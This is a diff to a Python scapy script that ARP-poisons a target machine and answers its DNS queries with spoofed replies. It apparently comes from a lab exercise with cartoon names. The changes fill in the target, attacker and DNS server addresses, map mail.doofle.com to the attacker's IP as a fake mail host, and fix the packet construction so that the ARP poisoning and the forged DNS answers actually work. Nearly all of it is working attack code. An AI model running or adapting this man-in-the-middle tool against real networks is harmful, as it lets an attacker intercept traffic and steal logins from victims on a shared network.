@@ -5,18 +5,18 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
 import scapy.all as scapy
 import time
 
-DOOFENSHMIRTZ_IP = "10.0.2.4"  # Enter the computer you attack's IP.
-SECRATERY_IP = "127.0.0.1"  # Enter the attacker's IP.
-NETWORK_DNS_SERVER_IP = "???"  # Enter the network's DNS server's IP.
+DOOFENSHMIRTZ_IP = "10.0.2.15"  # Enter the computer you attack's IP.
+SECRATERY_IP = "10.0.2.16"  # Enter the attacker's IP.
+NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
-IFACE = "???"  # Enter the network interface you work on.
+IFACE = "eth0"
 
 FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
-    b"???": FAKE_GMAIL_IP
+    b"mail.doofle.com": FAKE_GMAIL_IP
 }
 
 
@@ -79,9 +79,9 @@ class ArpSpoofer(object):
         target_mac = self.get_target_mac()
         # create an ARP response packet that convinces the target that we are the spoof_ip
         # op field of 2 means it's an ARP response, pdst is the target ip, hwdst is the target mac, psrc is the spoof ip
-        arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
+        arp_response = Ether(dst=target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
         # send the ARP response packet to the target
-        scapy.send(arp_response, iface=IFACE, verbose=False)
+        scapy.sendp(arp_response, iface=IFACE, verbose=False)
         # increase the spoof count by one
         self.spoof_count += 1
 
@@ -141,7 +141,8 @@ class DnsHandler(object):
         # if we received a response, we can modify the source IP of the response to be
         # our local IP, and then we can return the modified response
         if response:
-            response[IP].src = SECRATERY_IP
+            response[IP].src = pkt[IP].dst
+            response[IP].dst = pkt[IP].src
             # we also need to delete the length and checksum fields of the IP and UDP layers,
             # because they will be recalculated when we send the packet
             del response[IP].len
@@ -169,6 +170,10 @@ class DnsHandler(object):
             id=pkt[DNS].id,  # we need to keep the same ID as the request, so the target will accept the response
             qr=1,  # this is a response
             aa=1, # this is an authoritative answer
+            rd=pkt[DNS].rd,
+            ra=1,
+            qd=pkt[DNS].qd,
+            ancount=1,
             an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=to) # the answer section contains a single record, with the same name as the request, and the IP address we want to return as the response
         )
         spoofed_pkt = ip_layer / udp_layer / dns_layer
@@ -185,16 +190,16 @@ class DnsHandler(object):
         @return string describing the choice made
         """
         # we first check if the requested domain is in the spoof_dict, if it is, we return a spoofed response, otherwise we return a real response
-        requested_domain = pkt[DNS].qd.qname
+        requested_domain = pkt[DNS].qd.qname.rstrip(b".").lower()
         if requested_domain in self.spoof_dict:
             to_ip = self.spoof_dict[requested_domain]
             spoofed_response = self.get_spoofed_dns_response(pkt, to_ip)
-            scapy.send(spoofed_response, iface=IFACE, verbose=False)
+            scapy.send(spoofed_response, verbose=False)
             return f"Spoofed DNS response for {requested_domain.decode()} with IP {to_ip}"
         else:
             real_response = self.get_real_dns_response(pkt)
             if real_response:
-                scapy.send(real_response, iface=IFACE, verbose=False)
+                scapy.send(real_response, verbose=False)
                 return f"Forwarded DNS request for {requested_domain.decode()} to real DNS server and sent back the response"
             else:
                 return f"Failed to get real DNS response for {requested_domain.decode()} from real DNS server"
